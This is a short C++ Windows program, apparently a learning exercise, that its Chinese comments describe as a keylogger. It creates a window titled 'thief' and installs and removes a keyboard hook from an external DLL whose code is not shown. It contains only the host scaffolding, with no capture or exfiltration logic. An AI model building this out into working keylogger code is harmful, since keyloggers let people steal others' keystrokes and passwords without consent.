#include<Windows.h>
#pragma comment (lib,"key.lib")
extern "C" _declspec(dllimport) BOOL InstallHook();
extern "C" _declspec(dllimport) BOOL UninstallHook();
LRESULT CALLBACK WindowProc(HWND hWnd ,UINT uMsg ,WPARAM wParam ,LPARAM iParam );
//路口函数。，路口函数
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPreinstance, LPSTR lpCmdLine, int nCmdShow)
{
	//键盘记录器
	// 一，做一个窗口
	// 1设计窗口类
	TCHAR szAppClassName[] = TEXT("记录器");
	WNDCLASS wc = { 0 };
	wc.hbrBackground = (HBRUSH)GetStockObject(WHITE_BRUSH);//加载白色刷子
	wc.hCursor = LoadCursor(NULL, IDC_ARROW);//加载光标
	wc.hIcon = NULL;//图标句柄
	wc.hInstance = hInstance;//当前应用程序实例句柄
	wc.lpfnWndProc = WindowProc;//窗口处理函数
	wc.lpszClassName = szAppClassName;//窗口类型名
	wc.style = CS_HREDRAW | CS_VREDRAW;//窗口类型
	// 2注册窗口类
	RegisterClass(&wc);
	// 3创建窗口
	HWND hwnd = CreateWindow(szAppClassName, TEXT("小偷"), WS_BORDER | WS_CAPTION | WS_SYSMENU | WS_THICKFRAME | WS_MAXIMIZEBOX | WS_MINIMIZEBOX, 300, 200, 600, 400, NULL, NULL, hInstance, NULL);
	// 4显示窗口和更新窗口
	ShowWindow(hwnd, SW_SHOW);
	UpdateWindow(hwnd);
	// 5消息循环
	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0)) {
		//将虚拟键转换为字符消息
		TranslateMessage(&msg);
		//将消息分发给窗口处理函数处理
		DispatchMessageW(&msg);
		//加上上面的两行，窗口上的放大缩小关闭拖动就能用了


	}
	//安装钩子，hook技术
	//处理
	//
	return 0;
}
LRESULT CALLBACK WindowProc(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM iParam)
{
	switch (uMsg) {
	case WM_CREATE:
		InstallHook();
		break;
	case WM_CLOSE:
		DestroyWindow(hWnd);
		break;
	case WM_DESTROY:
		UninstallHook();
		PostQuitMessage(0);
		break;
	}
	return DefWindowProc(hWnd, uMsg, wParam, iParam);
}